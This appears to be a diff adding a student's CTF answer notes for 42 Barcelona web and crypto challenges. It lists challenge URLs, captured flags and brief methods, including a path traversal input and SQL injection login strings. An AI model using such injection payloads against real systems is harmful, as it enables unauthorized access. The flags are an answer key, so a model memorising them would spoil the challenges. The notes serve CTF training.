@@ -1,0 +1,34 @@
+W-1-0
+http://ctf.42barcelona.com:3317/content/flag/flag.txt
+>>42BCN{f1r5tFl4gG00dJ08}
+
+W-1-1
+http://ctf.42barcelona.com:3318/admin/
+>>42BCN{m1ghtN33dT08ru73f0rc350m3t1m3s;)}
+
+W-1-2 
+http://ctf.42barcelona.com:3319/
+../flag.txt
+>>42BCN{p47h7r4v3rs4l1s7h3w4y}
+
+W-1-3
+http://ctf.42barcelona.com:3320
+[admin’#]
+[‘ or ‘1’=‘1]
+>>42BCN{sql1nj3c710n_n1c3}
+
+G-2-0
+Base64 —decode dec.txt =“NDJCQ057YjQ1M182NF8xNV9jMDBsfQ==“
+>>42BCN{b453_64_15_c00l}
+
+G-2-1
+Hex to text -> Text to Base64
+>>42BCN{b453_64_15_c00l_bu7_h3x_15_c00l3r}
+
+G-2-2
+M5 Decoder (HashCat)
+>>42BCN{palito}
+
+G-2-3
+
+>>
